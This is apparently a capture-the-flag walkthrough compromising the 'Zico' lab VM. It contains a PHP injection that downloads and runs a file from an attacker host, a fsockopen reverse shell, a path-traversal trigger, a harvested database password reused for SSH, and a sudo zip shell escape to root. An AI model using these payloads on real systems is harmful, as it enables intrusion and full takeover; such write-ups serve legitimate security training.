ZICO

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
[+] Content Discovery
[+] phpLiteAdmin - Exploitation - reverse shell (database.php)
[+] Privilege Escalation Abusing SUDO rights -  tar
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Scan Results

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Nmap scan report for 192.168.56.105
Host is up (0.00083s latency).
Not shown: 997 closed ports
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 68:60:de:c2:2b:c6:16:d8:5b:88:be:e3:cc:a1:25:75 (DSA)
|   2048 50:db:75:ba:11:2f:43:c9:ab:14:40:6d:7f:a1:ee:e3 (RSA)
|_  256 11:5d:55:29:8a:77:d8:08:b4:00:9b:a3:61:93:fe:e5 (ECDSA)
80/tcp  open  http    Apache httpd 2.2.22 ((Ubuntu))
|_http-server-header: Apache/2.2.22 (Ubuntu)
|_http-title: Zico's Shop
111/tcp open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version   port/proto  service
|   100000  2,3,4        111/tcp  rpcbind
|   100000  2,3,4        111/udp  rpcbind
|   100024  1          33204/tcp  status
|_  100024  1          34732/udp  status
MAC Address: 08:00:27:98:69:CA (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 2.6.X|3.X
OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3
OS details: Linux 2.6.32 - 3.5
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Browsing to http://192.168.56.101/dbadimn we found a PhpLiteAdmin v1.9.3. Default password : admin

Reverse Shell

Create Database name " test1.php

Create Table test - Number of fiels 1
In creating new tables “  Filed : test | Type: TXT | value :  <?php system("wget 192.168.56.102/shell.txt -O /tmp/shell.php; php /tmp/shell.php"); ?>

Create a file in /var/www/html

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
root@setrus:~# cat /var/www/html/shell.txt 
<?php $sock=fsockopen("192.168.56.102",1234);exec("/bin/sh -i <&3 >&3 2>&3");?>
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


To call the php file, we use path traversal,

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
curl http://192.168.56.105/view.php?page=../../../../usr/databases/test1.php
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Receiving a Reverse Shell

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
root@setrus:~# nc -vnlp 1234
listening on [any] 1234 ...
connect to [192.168.56.102] from (UNKNOWN) [192.168.56.105] 48122
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ 

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Privilege Escalation

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
$ pwd
/home/zico/wordpress
$ cat wp-config.php
... snip ...
/** MySQL database username */
define('DB_USER', 'zico');

/** MySQL database password */
define('DB_PASSWORD', 'sWfCsfJSPV9H3AmQzw8');

/** MySQL hostname */
define('DB_HOST', 'zico');
 ... sniop ...

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


SSH with zico account : password :sWfCsfJSPV9H3AmQzw8'


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
root@setrus:~# ssh zico@192.168.56.105
The authenticity of host '192.168.56.105 (192.168.56.105)' can't be established.
ECDSA key fingerprint is SHA256:+zgKqxyYlTBxVO0xtTVGBokreS9Zr71wQGvnG/k2igw.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '192.168.56.105' (ECDSA) to the list of known hosts.
zico@192.168.56.105's password: 

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

zico@zico:~$
uid=1000(zico) gid=1000(zico) groups=1000(zico)
sudo -l
Matching Defaults entries for zico on this host:
    env_reset, exempt_group=admin,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User zico may run the following commands on this host:
    (root) NOPASSWD: /bin/tar
    (root) NOPASSWD: /usr/bin/zip
zico@zico:~$ cd /tmp

zico@zico:~$ mkdir exploit
zico@zico:~$ sudo zip exploit.zip exploit -T --unzip-command="python -c 'import pty; pty.spawn(\"/bin/sh\")'"
  adding: exploit/ (stored 0%)
# id
id
uid=0(root) gid=0(root) groups=0(root)
# 


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

